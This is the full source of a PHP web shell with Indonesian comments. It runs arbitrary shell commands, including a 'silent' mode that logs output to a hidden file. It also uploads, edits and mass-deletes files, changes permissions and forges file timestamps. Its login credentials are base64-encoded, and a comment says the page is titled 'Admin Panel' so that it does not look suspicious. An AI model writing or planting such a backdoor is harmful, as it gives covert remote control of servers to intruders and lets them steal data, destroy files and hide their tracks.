<?php
session_start();

// Anti-Deteksi: Cek integritas file
if (filesize(__FILE__) < 100) { // Kalo file jadi 0-byte atau terlalu kecil
    die("Shell corrupted or blocked!");
}

// Login Credentials (Disamarkan)
define('U', base64_decode('WGllbGdhbnN6')); // "Xielgansz"
define('P', base64_decode('eGllbGdhbnRlbmc=')); // "xielganteng"

// Cek Login
if (!isset($_SESSION['loggedin']) || $_SESSION['loggedin'] !== true) {
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['username']) && isset($_POST['password'])) {
        if ($_POST['username'] === U && $_POST['password'] === P) {
            $_SESSION['loggedin'] = true;
        } else {
            die('<center><h2>Login Failed!</h2><p>Wrong username or password.</p><a href="?">Try again</a></center>');
        }
    } else {
        die('<!DOCTYPE html><html><head><title>Login</title><meta name="viewport" content="width=device-width, initial-scale=1"><link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet"><style>body{background:linear-gradient(135deg,#1e1e1e,#2d3748);height:100vh;display:flex;align-items:center;justify-content:center}.login-box{animation:fadeIn 1s ease-in}</style></head><body><div class="login-box bg-gray-800 p-6 rounded-lg shadow-2xl w-96"><h2 class="text-2xl text-white font-bold mb-4">Login</h2><form method="post"><input type="text" name="username" placeholder="Username" class="w-full p-3 mb-4 bg-gray-700 text-white rounded-lg focus:outline-none focus:ring-2 focus:ring-green-500" required><input type="password" name="password" placeholder="Password" class="w-full p-3 mb-4 bg-gray-700 text-white rounded-lg focus:outline-none focus:ring-2 focus:ring-green-500" required><button type="submit" class="w-full p-3 bg-green-600 text-white rounded-lg hover:bg-green-700 transition duration-300">Login</button></form></div></body></html>');
    }
}

// Inisialisasi
$tz = date_default_timezone_get();
date_default_timezone_set($tz);
$rd = realpath($_SERVER['DOCUMENT_ROOT']);
$sd = dirname(__FILE__);
$cd = realpath(isset($_GET['d']) ? base64_decode($_GET['d']) : $rd);
chdir($cd);
$ro = '';

function e($d) { return base64_encode($d); }
function d($d) { return base64_decode($d); }

// Fitur 1: Mengedit Timestamp
function st($f, $t) {
    try {
        if (!preg_match('/^\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2}$/', $t)) {
            throw new Exception("Invalid format. Use YYYY-MM-DD HH:MM:SS.");
        }
        $ts = strtotime($t);
        if ($ts === false) throw new Exception("Invalid timestamp.");
        if (touch($f, $ts)) return "Timestamp set to $t!";
        throw new Exception("Failed to set timestamp.");
    } catch (Exception $e) {
        return "Error: " . $e->getMessage();
    }
}

// Fitur 2: Mengedit File
function ef($f, $c) {
    try {
        if (!file_exists($f)) throw new Exception("File not found.");
        if (!is_writable($f)) throw new Exception("Permission denied.");
        if (file_put_contents($f, $c) !== false) return "File updated!";
        throw new Exception("Failed to update file.");
    } catch (Exception $e) {
        return "Error: " . $e->getMessage();
    }
}

// Fitur: Mengubah Chmod
function sc($f, $p) {
    try {
        if (!preg_match('/^[0-7]{3}$/', $p)) {
            throw new Exception("Invalid chmod. Use 3-digit octal.");
        }
        $po = octdec($p);
        if (chmod($f, $po)) return "Permissions set to $p!";
        throw new Exception("Failed to set permissions.");
    } catch (Exception $e) {
        return "Error: " . $e->getMessage();
    }
}

// Logging
$lf = $cd . '/.xlog';
function la($m) {
    global $lf;
    file_put_contents($lf, "[" . date('Y-m-d H:i:s') . "] $m\n", FILE_APPEND);
}

// Fitur: Mass Delete/Edit
if (isset($_POST['ma']) && isset($_POST['sf'])) {
    $fs = $_POST['sf'];
    if ($_POST['ma'] === 'd') {
        $dl = 0;
        foreach ($fs as $f) {
            $fp = $cd . '/' . $f;
            if (file_exists($fp)) {
                is_dir($fp) ? rr($fp) : unlink($fp);
                $dl++;
            }
        }
        $ro = "Deleted $dl file(s)!";
    } elseif ($_POST['ma'] === 'et' && isset($_POST['mt'])) {
        $t = $_POST['mt'];
        $ed = 0;
        foreach ($fs as $f) {
            $fp = $cd . '/' . $f;
            if (file_exists($fp) && st($fp, $t) === "Timestamp set to $t!") {
                $ed++;
            }
        }
        $ro = "Edited timestamp for $ed file(s)!";
    }
}


function rr($d) {
    if (!is_dir($d)) return unlink($d);
    foreach (scandir($d) as $i) {
        if ($i == '.' || $i == '..') continue;
        rr($d . '/' . $i);
    }
    return rmdir($d);
}

// Pemrosesan POST
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_FILES['fu'])) {
        $tg = $cd . '/' . basename($_FILES["fu"]["name"]);
        $ro = move_uploaded_file($_FILES["fu"]["tmp_name"], $tg) ? "File uploaded!" : "Upload failed!";
    } elseif (isset($_POST['fn'])) {
        $nf = $cd . '/' . $_POST['fn'];
        $ro = (!file_exists($nf) && mkdir($nf)) ? "Folder created!" : "Folder creation failed!";
    } elseif (isset($_POST['f'])) {
        $f = $cd . '/' . $_POST['f'];
        $ro = (file_put_contents($f, $_POST['fc']) !== false) ? "File created/edited!" : "File operation failed!";
    } elseif (isset($_POST['df'])) {
        $f = $cd . '/' . $_POST['df'];
        $ro = (file_exists($f) && (is_dir($f) ? rr($f) : unlink($f))) ? "Deleted!" : "Delete failed!";
    } elseif (isset($_POST['st'])) {
        $f = $cd . '/' . $_POST['fm'];
        $ro = st($f, $_POST['ct']);
    } elseif (isset($_POST['ef'])) {
        $f = $cd . '/' . $_POST['fe'];
        $ro = ef($f, $_POST['fc']);
    } elseif (isset($_POST['ci'])) {
        $c = $_POST['ci'];
        $s = isset($_POST['s']);
        $o = shell_exec($c . " 2>&1");
        if ($s) {
            la("Command: $c | Output: $o");
            $ro = "Command executed silently. Check log.";
        } else {
            $ro = $o;
        }
    } elseif (isset($_POST['sc'])) {
        $f = $cd . '/' . $_POST['fc'];
        $ro = sc($f, $_POST['cv']);
    }
}

// Menangani Klik File
$fv = isset($_GET['f']) ? d($_GET['f']) : null;
$fc = $fv && file_exists($cd . '/' . $fv) ? file_get_contents($cd . '/' . $fv) : '';

?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Panel</title> <!-- Ganti judul biar ga mencurigakan -->
    <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&display=swap" rel="stylesheet">
    <style>
        body {background: linear-gradient(135deg, #1e1e1e, #2d3748); font-family: 'Orbitron', sans-serif; color: #e2e8f0; overflow-x: hidden;}
        .container {animation: slideIn 0.5s ease-out;}
        .glow {box-shadow: 0 0 15px rgba(16, 185, 129, 0.5); transition: all 0.3s ease;}
        .glow:hover {box-shadow: 0 0 25px rgba(16, 185, 129, 0.8); transform: scale(1.02);}
        .table-row:hover {background: rgba(16, 185, 129, 0.1); transform: translateX(5px); transition: all 0.3s ease;}
        .btn {background: linear-gradient(90deg, #10b981, #059669); transition: all 0.3s ease;}
        .btn:hover {background: linear-gradient(90deg, #059669, #10b981); transform: translateY(-2px);}
        textarea, input {transition: all 0.3s ease;}
        textarea:focus, input:focus {border-color: #10b981; box-shadow: 0 0 10px rgba(16, 185, 129, 0.5);}
        @keyframes slideIn {from {opacity: 0; transform: translateY(20px);} to {opacity: 1; transform: translateY(0);}}
        @media (max-width: 640px) {.container {width: 95%;} table {font-size: 0.8rem;}}
    </style>
    <script>
        function tc(s) {
            let c = document.querySelectorAll('input[name="sf[]"]');
            c.forEach(x => x.checked = s.checked);
        }
    </script>
</head>
<body>
<div class="container max-w-5xl mx-auto p-6">
    <h1 class="text-4xl font-bold text-center text-green-400 mb-6 animate-pulse">Admin Panel</h1>
    <div class="bg-gray-800 p-4 rounded-lg glow mb-6">
        <p class="text-sm">Time: <?php echo date('Y-m-d H:i:s'); ?></p>
        <p class="mt-2">Path: 
        <?php
        $ds = explode(DIRECTORY_SEPARATOR, $cd);
        $p = '';
        foreach ($ds as $dr) {
            if ($dr) {
                $p .= DIRECTORY_SEPARATOR . $dr;
                echo '<a href="?d=' . e($p) . '" class="text-green-400 hover:underline">/' . $dr . '</a>';
            }
        }
        echo ' <a href="?d=' . e($sd) . '" class="text-green-600">[Home]</a>';
        ?>
        </p>
    </div>

    <div class="grid grid-cols-1 md:grid-cols-2 gap-4 mb-6">
        <form method="post" class="bg-gray-800 p-4 rounded-lg glow">
            <input type="text" name="fn" placeholder="New Folder" class="w-full p-3 bg-gray-700 rounded-lg mb-2">
            <button type="submit" class="btn w-full p-3 text-white rounded-lg">Create</button>
        </form>
        <form method="post" class="bg-gray-800 p-4 rounded-lg glow">
            <input type="text" name="f" placeholder="New File" class="w-full p-3 bg-gray-700 rounded-lg mb-2">
            <textarea name="fc" placeholder="Content" class="w-full p-3 bg-gray-700 rounded-lg mb-2 h-24"></textarea>
            <button type="submit" class="btn w-full p-3 text-white rounded-lg">Create</button>
        </form>
        <form method="post" enctype="multipart/form-data" class="bg-gray-800 p-4 rounded-lg glow">
            <input type="file" name="fu" class="w-full p-3 bg-gray-700 rounded-lg mb-2 text-sm">
            <button type="submit" class="btn w-full p-3 text-white rounded-lg">Upload</button>
        </form>
        <form method="post" class="bg-gray-800 p-4 rounded-lg glow">
            <input type="text" name="fm" placeholder="File to modify" class="w-full p-3 bg-gray-700 rounded-lg mb-2">
            <input type="text" name="ct" placeholder="YYYY-MM-DD HH:MM:SS" class="w-full p-3 bg-gray-700 rounded-lg mb-2">
            <button type="submit" name="st" class="btn w-full p-3 text-white rounded-lg">Set Time</button>
        </form>
        <form method="post" class="bg-gray-800 p-4 rounded-lg glow">
            <input type="text" name="fc" placeholder="File/Folder" class="w-full p-3 bg-gray-700 rounded-lg mb-2">
            <input type="text" name="cv" placeholder="e.g., 755" class="w-full p-3 bg-gray-700 rounded-lg mb-2">
            <button type="submit" name="sc" class="btn w-full p-3 text-white rounded-lg">Set Perms</button>
        </form>
        <form method="post" class="bg-gray-800 p-4 rounded-lg glow md:col-span-2">
            <input type="text" name="ci" placeholder="Command" class="w-full p-3 bg-gray-700 rounded-lg mb-2">
            <label class="text-sm text-gray-400"><input type="checkbox" name="s" class="mr-2"> Silent</label>
            <button type="submit" class="btn w-full p-3 text-white rounded-lg mt-2">Run</button>
        </form>
        
    </div>

    <?php if ($ro) echo '<div class="bg-gray-800 p-4 rounded-lg glow mb-6"><textarea class="w-full h-32 bg-gray-700 text-white rounded-lg p-3">' . htmlspecialchars($ro) . '</textarea></div>'; ?>

    <?php if ($fv): ?>
        <div class="bg-gray-800 p-4 rounded-lg glow mb-6">
            <h2 class="text-xl text-green-400 mb-4">Editing: <?php echo htmlspecialchars($fv); ?></h2>
            <form method="post" class="mb-4">
                <textarea name="fc" class="w-full h-64 bg-gray-700 text-white rounded-lg p-3"><?php echo htmlspecialchars($fc); ?></textarea>
                <input type="hidden" name="fe" value="<?php echo htmlspecialchars($fv); ?>">
                <div class="flex gap-4 mt-4">
                    <button type="submit" name="ef" class="btn flex-1 p-3 text-white rounded-lg">Save</button>
                    <button type="submit" name="df" value="<?php echo htmlspecialchars($fv); ?>" class="bg-red-600 flex-1 p-3 text-white rounded-lg hover:bg-red-700 transition duration-300">Delete</button>
                </div>
            </form>
        </div>
    <?php endif; ?>

    <form method="post" class="bg-gray-800 p-4 rounded-lg glow mb-6">
        <div class="overflow-x-auto">
            <table class="w-full text-sm">
                <thead>
                    <tr class="bg-gray-700">
                        <th class="p-3"><input type="checkbox" id="sa" onclick="tc(this)"></th>
                        <th class="p-3">Name</th>
                        <th class="p-3">Size</th>
                        <th class="p-3">Date</th>
                        <th class="p-3">Perms</th>
                    </tr>
                </thead>
                <tbody>
                <?php
                foreach (scandir($cd) as $i) {
                    if ($i == '.' || $i == '..') continue;
                    $fp = $cd . '/' . $i;
                    $p = substr(sprintf('%o', fileperms($fp)), -4);
                    $l = is_dir($fp) ? '?d=' . e($fp) : '?d=' . e($cd) . '&f=' . e($i);
                    echo "<tr class='table-row'><td class='p-3'><input type='checkbox' name='sf[]' value='$i'></td><td class='p-3'><a href='$l' class='text-green-400 hover:underline'>$i</a></td><td class='p-3'>" . filesize($fp) . "</td><td class='p-3'>" . date('Y-m-d H:i:s', filemtime($fp)) . "</td><td class='p-3 " . (is_writable($fp) ? 'text-green-400' : 'text-red-400') . "'>$p</td></tr>";
                }
                ?>
                </tbody>
            </table>
        </div>
        <div class="flex gap-4 mt-4">
            <button type="submit" name="ma" value="d" class="bg-red-600 flex-1 p-3 text-white rounded-lg hover:bg-red-700 transition duration-300">Delete Selected</button>
            <input type="text" name="mt" placeholder="YYYY-MM-DD HH:MM:SS" class="flex-1 p-3 bg-gray-700 rounded-lg">
            <button type="submit" name="ma" value="et" class="btn flex-1 p-3 text-white rounded-lg">Set Time Selected</button>
        </div>
    </form>
</div>
</body>
</html>